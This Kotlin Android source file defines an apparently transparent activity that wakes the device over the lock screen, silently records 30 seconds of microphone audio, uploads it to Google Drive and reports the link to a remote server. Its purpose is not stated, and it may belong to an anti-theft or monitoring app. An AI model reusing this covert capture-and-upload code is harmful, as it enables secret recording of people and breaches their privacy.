package com.neubofy.veto.ui

import android.Manifest
import android.content.pm.PackageManager
import android.media.MediaRecorder
import android.os.Build
import android.os.Bundle
import android.view.WindowManager
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.neubofy.veto.utils.GoogleDriveUploader
import com.neubofy.veto.utils.log
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File

class DummyAudioActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val ctx = applicationContext
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            ctx.log().w(TAG, "Audio permission missing.")
            finish()
            return
        }

        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.O) {
            @Suppress("Deprecation")
            window.addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON)
        }

        lifecycleScope.launch {
            recordAudio()
        }
    }

    private suspend fun recordAudio() {
        val ctx = applicationContext
        val outputFile = File(cacheDir, "audio_${System.currentTimeMillis()}.m4a")
        val recorder = MediaRecorder()
        try {
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            recorder.setOutputFile(outputFile.absolutePath)
            recorder.prepare()
            recorder.start()

            ctx.log().i(TAG, "Started recording audio in transparent activity...")
            kotlinx.coroutines.delay(30000L) // 30 seconds

            recorder.stop()
            recorder.release()
            
            GoogleDriveUploader.uploadFile(
                context = ctx,
                file = outputFile,
                mimeType = "audio/mp4",
                type = "audio",
                onSuccess = { link ->
                    outputFile.delete()
                    val transport = com.neubofy.veto.transports.NextJsServerTransport(ctx)
                    transport.send(ctx, "Audio Captured: $link", "audio")
                    finish()
                },
                onError = { error ->
                    outputFile.delete()
                    val transport = com.neubofy.veto.transports.NextJsServerTransport(ctx)
                    transport.send(ctx, "Failed to upload audio: $error", "audio")
                    finish()
                }
            )
        } catch (e: Exception) {
            ctx.log().e(TAG, "Audio recording failed: ${e.message}")
            recorder.release()
            outputFile.delete()
            finish()
        }
    }

    companion object {
        val TAG = DummyAudioActivity::class.simpleName
    }
}
